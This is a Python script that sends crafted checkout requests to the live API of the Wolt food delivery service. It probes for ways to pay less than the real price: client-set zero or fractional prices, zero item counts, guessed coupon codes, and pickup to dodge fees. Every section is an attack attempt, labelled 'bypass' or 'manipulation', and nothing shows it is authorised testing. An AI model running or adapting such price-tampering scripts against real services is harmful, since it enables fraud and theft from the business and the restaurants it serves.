import requests, json

h = {'User-Agent': 'Mozilla/5.0', 'Origin': 'https://wolt.com', 'Content-Type': 'application/json', 'App-Language': 'en'}

# 1. Try pickup (self-delivery) to avoid delivery fee
print("=== PICKUP BYPASS ===")
payload_pickup = {
    "purchase_plan": {
        "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
        "delivery_method": "pickup",  # self-pickup = no delivery fee
        "menu_items": [
            {"id": "60ebeb71c6904c2caf035f71", "name": "Test", "count": 1,
             "base_price": 100, "price": 100, "end_amount": 100,
             "options": [], "category_id": "test", "exclude_from_discounts": False,
             "restrictions": []}
        ]
    }
}
r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                 json=payload_pickup, headers=h, timeout=15)
d = r.json() if r.status_code == 200 else {}
print(f'  pickup + price=100: {r.status_code} | payable={d.get("payable_amount","?")} | delivery_fee={d.get("delivery_fee","?")} | bag_fee={d.get("bag_fee","?")}')

# 2. Try with price=0 + pickup
payload_zero = {
    "purchase_plan": {
        "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
        "delivery_method": "pickup",
        "menu_items": [
            {"id": "60ebeb71c6904c2caf035f71", "name": "Test", "count": 1,
             "base_price": 0, "price": 0, "end_amount": 0,
             "options": [], "category_id": "test", "exclude_from_discounts": False,
             "restrictions": []}
        ]
    }
}
r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                 json=payload_zero, headers=h, timeout=15)
d = r.json() if r.status_code == 200 else {}
print(f'  pickup + price=0: {r.status_code} | payable={d.get("payable_amount","?")} | delivery_fee={d.get("delivery_fee","?")} | bag_fee={d.get("bag_fee","?")}')
purchasing = d.get('purchasing_disabled', 'N/A')
print(f'  purchasing_disabled: {purchasing}')

# 3. Try coupon/discount manipulation
print("\n=== COUPON MANIPULATION ===")
for coupon in ['FREE100', 'WELCOME', 'DISCOUNT50', '']:
    payload_c = {
        "purchase_plan": {
            "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
            "delivery_method": "homedelivery",
            "menu_items": [
                {"id": "60ebeb71c6904c2caf035f71", "name": "Test", "count": 1,
                 "base_price": 500, "price": 500, "end_amount": 500,
                 "options": [], "category_id": "test", "exclude_from_discounts": False,
                 "restrictions": []}
            ],
            "coupon_code": coupon
        }
    }
    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                     json=payload_c, headers=h, timeout=15)
    d = r.json() if r.status_code == 200 else {}
    payable = d.get('payable_amount', d.get('msg', '?'))
    print(f'  coupon="{coupon}": {r.status_code} | payable={payable}')

# 4. Check if count=0 bypass (get items for free)
print("\n=== COUNT=0 BYPASS ===")
payload_count0 = {
    "purchase_plan": {
        "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
        "delivery_method": "homedelivery",
        "menu_items": [
            {"id": "60ebeb71c6904c2caf035f71", "name": "Test", "count": 0,
             "base_price": 999, "price": 999, "end_amount": 999,
             "options": [], "category_id": "test", "exclude_from_discounts": False,
             "restrictions": []}
        ]
    }
}
r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                 json=payload_count0, headers=h, timeout=15)
d = r.json() if r.status_code == 200 else {}
print(f'  count=0: {r.status_code} | payable={d.get("payable_amount","?")} | text={r.text[:150]}')

# 5. Try round-down: price=0.001 
print("\n=== FLOAT PRECISION ===")
for p in [0.01, 0.5]:
    payload_f = {
        "purchase_plan": {
            "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
            "delivery_method": "homedelivery",
            "menu_items": [
                {"id": "60ebeb71c6904c2caf035f71", "name": "Test", "count": 1,
                 "base_price": p, "price": p, "end_amount": p,
                 "options": [], "category_id": "test", "exclude_from_discounts": False,
                 "restrictions": []}
            ]
        }
    }
    r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                     json=payload_f, headers=h, timeout=15)
    d = r.json() if r.status_code == 200 else {}
    print(f'  price={p}: {r.status_code} | payable={d.get("payable_amount","?")}')
